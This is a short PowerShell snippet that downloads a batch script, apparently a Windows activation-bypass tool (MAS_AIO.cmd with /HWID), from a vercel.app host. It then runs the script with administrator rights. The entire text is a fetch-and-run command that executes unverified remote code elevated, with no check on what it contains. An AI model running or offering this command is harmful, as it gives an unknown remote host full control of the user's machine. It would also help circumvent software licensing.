$tmp = "$env:TEMP\MAS_AIO.cmd"
Invoke-WebRequest "https://winact.vercel.app/MAS_AIO.cmd" -OutFile $tmp
Start-Process cmd.exe -ArgumentList "/c `"$tmp`" /HWID" -Verb RunAs
